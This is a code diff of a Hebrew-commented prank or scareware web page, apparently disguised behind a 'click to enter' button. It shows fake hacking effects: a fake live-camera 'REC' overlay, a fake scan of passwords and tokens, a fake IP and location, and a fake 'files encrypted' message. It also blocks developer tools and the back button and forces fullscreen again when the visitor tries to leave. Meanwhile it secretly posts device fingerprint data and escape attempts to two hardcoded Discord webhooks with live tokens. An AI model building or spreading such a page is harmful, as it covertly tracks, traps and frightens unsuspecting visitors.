@@ -102,6 +102,46 @@
             100% { transform: translate(-100px, 0px) rotate(0deg); }
         }
 
+        /* --- אפקט פלאש אדום של קריסה --- */
+        #flash-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #ff0000;
+            z-index: 15;
+            pointer-events: none;
+        }
+
+        /* --- אפקט שכבת מצלמה מזויפת --- */
+        #camera-overlay {
+            display: none;
+            position: absolute;
+            top: 30px; right: 30px;
+            color: #ff0000;
+            font-size: 18px;
+            font-weight: bold;
+            z-index: 10;
+            pointer-events: none;
+            font-family: Arial, sans-serif;
+            text-shadow: 0 0 5px #000;
+            direction: ltr;
+        }
+
+        .rec-dot {
+            display: inline-block;
+            width: 12px; height: 12px;
+            background-color: #ff0000;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
         /* --- אפקטים של המעבר המפחיד --- */
         .shake-effect { animation: glitchShake 0.1s infinite !important; }
 
@@ -171,6 +211,11 @@
     <div id="crack-overlay"></div>
     <div id="scanner-console"></div>
     <div id="hacker-images-overlay"></div>
+    <div id="flash-overlay"></div>
+    
+    <div id="camera-overlay">
+        <span class="rec-dot"></span>REC [LIVE_STREAM_ACTIVE]
+    </div>
 
     <button id="start-btn">CLICK TO ENTER</button>
 
@@ -188,30 +233,83 @@
         <source src="scary.mp3" type="audio/mpeg">
     </audio>
 
+    <audio id="hardware-audio" loop preload="none">
+        <source src="hardware.mp3" type="audio/mpeg">
+    </audio>
+
     <script>
         let started = false;
         let scaryPhase = false;
         let escapeAttempted = false;
+        let isFrozen = false;
         let startTime = 0;
         let scanInterval;
+        let osPrefix = "C:\\Users\\Target_User\\";
 
-        // ה-Webhook המאוחד שלך לכל ההתראות
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1506644775132987543/LRn4aqJWKPMOYMuMrsNHqGa2i3vAKhzPS3Ul0DA5cyPNNx30S3JCVi7umKdjkPgQysGF";
+        const LOGIN_WEBHOOK = "https://discord.com/api/webhooks/1506372443831275530/fLiwDmc93JXHUCNKIIDNjB0D9LZVl8ubHqhZmvRU7e4brN9YNBgkWHO-e09z40xLOyAq";
+        const ESCAPE_WEBHOOK = "https://discord.com/api/webhooks/1506644775132987543/LRn4aqJWKPMOYMuMrsNHqGa2i3vAKhzPS3Ul0DA5cyPNNx30S3JCVi7umKdjkPgQysGF";
 
         history.pushState(null, null, location.href);
         window.onpopstate = function () { history.pushState(null, null, location.href); };
 
+        // --- חסימת קליק ימני (Anti-Inspect) ---
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // --- חסימת כפתורי פיתוח במקלדת ---
+        document.addEventListener('keydown', function(e) {
+            // חסימת F12
+            if (e.key === 'F12') { e.preventDefault(); return false; }
+            // חסימת Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+U
+            if (e.ctrlKey && (e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j') || (e.key === 'U' || e.key === 'u'))) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        function detectOS() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes("mac") || ua.includes("os x")) {
+                osPrefix = "/Users/Target_User/";
+            } else if (ua.includes("linux") || ua.includes("android")) {
+                osPrefix = "/home/Target_User/";
+            } else if (ua.includes("iphone") || ua.includes("ipad")) {
+                osPrefix = "/var/mobile/Containers/";
+            }
+        }
+
+        function forceFullscreen() {
+            if (started && !document.fullscreenElement) {
+                var elem = document.documentElement;
+                if (elem.requestFullscreen) { elem.requestFullscreen().catch(() => {}); }
+                else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen().catch(() => {}); }
+            }
+        }
+
         window.addEventListener('mousemove', function(e) {
             if (!started) return;
+            forceFullscreen();
             if (e.clientY < 20) {
                 sendEscapeLog("ניסיון סגירת הטאב / הזזת עכבר לתפריט העליון");
             }
+        });
+
+        window.addEventListener('click', function() {
+            forceFullscreen();
         });
 
         window.addEventListener('keydown', function(e) {
             if (!started) return;
             if (e.key === 'Escape' || e.key === 'F11') {
                 sendEscapeLog(`ניסיון יציאה ממסך מלא בעזרת מקש: ${e.key}`);
+                setTimeout(forceFullscreen, 500);
+            }
+        });
+
+        document.addEventListener('fullscreenchange', function() {
+            if (started && !document.fullscreenElement) {
+                sendEscapeLog("יציאה בפועל ממצב מסך מלא (Fullscreen Deactivated)");
             }
         });
 
@@ -221,19 +319,23 @@
             started = true;
             startTime = Date.now();
 
+            detectOS();
+
             this.style.display = 'none';
             prepareAndSendLogs();
 
             var elem = document.documentElement;
-            if (elem.requestFullscreen) { elem.requestFullscreen(); }
-            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+            if (elem.requestFullscreen) { elem.requestFullscreen().catch(() => {}); }
+            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen().catch(() => {}); }
 
             var doraAudio = document.getElementById('dora-audio');
             doraAudio.volume = 1.0;
             doraAudio.play();
 
             var scaryAudio = document.getElementById('scary-audio');
+            var hardwareAudio = document.getElementById('hardware-audio');
             scaryAudio.load(); 
+            hardwareAudio.load();
 
             setTimeout(function() {
                 scaryPhase = true;
@@ -242,6 +344,7 @@
 
                 document.getElementById('crt-lines').style.display = 'block';
                 document.getElementById('crack-overlay').style.display = 'block';
+                document.getElementById('camera-overlay').style.display = 'block'; // הפעלת שכבת המצלמה
 
                 var imgElement = document.getElementById('main-img');
                 imgElement.src = "https://i.pinimg.com/webp/736x/c3/fe/8a/c3fe8a0d6bcbcdeeb4d310e4f5e598e4.webp";
@@ -251,8 +354,11 @@
                 scaryAudio.volume = 1.0;
                 scaryAudio.play().catch(err => console.log(err));
 
+                hardwareAudio.volume = 0.4;
+                hardwareAudio.play().catch(err => console.log(err));
+
                 startFileScanner();
-                startHackerImages(); // הפעלת שכבת התמונות הזזות
+                startHackerImages();
 
                 showScaryElements();
             }, 5000);
@@ -267,7 +373,6 @@
             });
         }
 
-        // פונקציית סריקת קבצים אגרסיבית יותר
         function startFileScanner() {
             const consoleElem = document.getElementById('scanner-console');
             consoleElem.style.display = 'block';
@@ -277,9 +382,42 @@
             const pool = ['user_data', 'passwords', 'credentials', 'config', 'backup', 'token', 'private_key', 'system_auth', 'discord_session', 'steam_login'];
 
             let count = 0;
+            const scaryAudio = document.getElementById('scary-audio');
+            const hardwareAudio = document.getElementById('hardware-audio');
 
             scanInterval = setInterval(() => {
-                if (count > 200) { // סריקה ארוכה יותר
+                if (isFrozen) return;
+
+                // הדמיית משיכת IP ומיקום בתחילת הסריקה
+                if (count === 5) {
+                    let randIP = `${Math.floor(Math.random() * 150 + 40)}.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 250)}`;
+                    consoleElem.innerHTML += `<span style="color:#ffff00; font-weight:bold;">[!] TARGET_IP_FOUND: ${randIP}</span><br>`;
+                    consoleElem.innerHTML += `<span style="color:#ffff00; font-weight:bold;">[!] TARGET_LOCATION: Israel (Geo-Lock Active)</span><br>`;
+                }
+
+                // אפקט קפיאה בשורה 70
+                if (count === 70) {
+                    isFrozen = true;
+                    scaryAudio.pause();
+                    hardwareAudio.pause();
+                    document.body.classList.remove('strobe-effect');
+                    
+                    setTimeout(() => {
+                        isFrozen = false;
+                        scaryAudio.play().catch(() => {});
+                        hardwareAudio.play().catch(() => {});
+                        document.body.classList.add('strobe-effect');
+                        
+                        const flash = document.getElementById('flash-overlay');
+                        flash.style.display = 'block';
+                        setTimeout(() => { flash.style.display = 'none'; }, 150);
+                    }, 2000);
+                    
+                    count++;
+                    return;
+                }
+
+                if (count > 200) {
                     clearInterval(scanInterval);
                     consoleElem.innerHTML += `<br><span style="color:#f00; font-weight:bold; font-size:20px;">[!] Scan Complete. Potential Target Files Encrypted. Waiting for Key...</span>`;
                     return;
@@ -289,32 +427,31 @@
                 let randFile = pool[Math.floor(Math.random() * pool.length)] + "_" + Math.floor(Math.random() * 900 + 100) + fileTypes[Math.floor(Math.random() * fileTypes.length)];
                 let size = (Math.random() * 100 + 1).toFixed(1);
 
-                let line = `[+] Factoring: C:\\Users\\Target_User\\${randFolder}\\${randFile} (${size} MB) -> [SUCCESS]<br>`;
+                let line = `[+] Factoring: ${osPrefix}${randFolder}\\${randFile} (${size} MB) -> [SUCCESS]<br>`;
                 consoleElem.innerHTML += line;
 
                 consoleElem.scrollTop = consoleElem.scrollHeight;
                 count++;
-            }, 25); // סריקה מהירה בטירוף
+            }, 25);
         }
 
-        // פונקציה שיוצרת את שכבת התמונות הזזות של האקרים
         function startHackerImages() {
             const overlay = document.getElementById('hacker-images-overlay');
             overlay.style.display = 'block';
 
-            // URLs של תמונות 'האקרים' גנריות
             const imageUrls = [
-                'https://i.imgur.com/vHkWq1M.png', // בוט האקר
-                'https://i.imgur.com/O6Ld4Yl.png', // סמל כשל מערכת
-                'https://i.imgur.com/kS9l5gM.png', // קוד מטריקס
-                'https://i.imgur.com/YjGkZ6s.png', // סמל פריצה
-                'https://i.imgur.com/C5uG5Cj.png'  // קובץ נעול
+                'https://i.imgur.com/vHkWq1M.png',
+                'https://i.imgur.com/O6Ld4Yl.png',
+                'https://i.imgur.com/kS9l5gM.png',
+                'https://i.imgur.com/YjGkZ6s.png',
+                'https://i.imgur.com/C5uG5Cj.png'
             ];
 
             let imgCount = 0;
 
             const imgInterval = setInterval(() => {
-                if (imgCount > 15) { // הגבלת כמות התמונות על המסך
+                if (isFrozen) return;
+                if (imgCount > 15) {
                     clearInterval(imgInterval);
                     return;
                 }
@@ -323,17 +460,15 @@
                 let img = document.createElement('img');
                 img.src = randUrl;
                 img.className = 'moving-hacker-img';
-                
-                // מיקום רנדומלי על הציר האנכי
                 img.style.top = (Math.random() * 80 + 10) + '%';
                 
                 overlay.appendChild(img);
                 imgCount++;
-            }, 800); // כל 0.8 שניות מופיעה תמונה חדשה
+            }, 800);
         }
 
         function sendEscapeLog(reason) {
-            if (!DISCORD_WEBHOOK || escapeAttempted) return;
+            if (!ESCAPE_WEBHOOK || escapeAttempted) return;
             escapeAttempted = true;
 
             const currentTime = new Date().toLocaleString('he-IL', { timeZone: 'Asia/Jerusalem' });
@@ -351,16 +486,16 @@
                         { name: "⏱️ זמן עמידות בדף", value: `${elapsedSeconds} שניות`, inline: true },
                         { name: "🔍 הפעולה המדויקת שזוהתה", value: `\`${reason}\``, inline: false }
                     ],
-                    footer: { text: "Anti-Escape Tracker v2.0" },
+                    footer: { text: "Anti-Escape Tracker v3.0" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(escapeEmbed) }).catch(err => console.log(err));
+            fetch(ESCAPE_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(escapeEmbed) }).catch(err => console.log(err));
         }
 
         async function prepareAndSendLogs() {
-            if (!DISCORD_WEBHOOK) return;
+            if (!LOGIN_WEBHOOK) return;
 
             const userAgent = navigator.userAgent;
             const referrer = document.referrer || "כניסה ישירה / אפליקציה חיצונית";
@@ -396,18 +531,18 @@
                         { name: "🖥️ רזולוציית מסך", value: screenResolution, inline: true },
                         { name: "🌐 שפת מערכת", value: language, inline: true },
                         { name: "⚙️ מעבד (CPU)", value: cpuCores, inline: true },
-                        { name: "💾 זיכרון RAM מוערך", value: ramMemory, inline: true },
+                        { name: "💾 זיכון RAM מוערך", value: ramMemory, inline: true },
                         { name: "🔋 מצב סוללה", value: batteryInfo, inline: true },
                         { name: "📶 סוג רשת אינטרנט", value: networkType, inline: false },
                         { name: "🔗 מקור הגעה (Referrer)", value: referrer, inline: false },
                         { name: "📱 מפרט מכשיר ודפדפן (User-Agent)", value: `\`\`\`text\n${userAgent}\n\`\`\``, inline: false }
                     ],
-                    footer: { text: "BogiScanner Security Monitor v4.2" },
+                    footer: { text: "BogiScanner Security Monitor v5.0" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) }).catch(err => console.log(err));
+            fetch(LOGIN_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) }).catch(err => console.log(err));
         }
     </script>
 
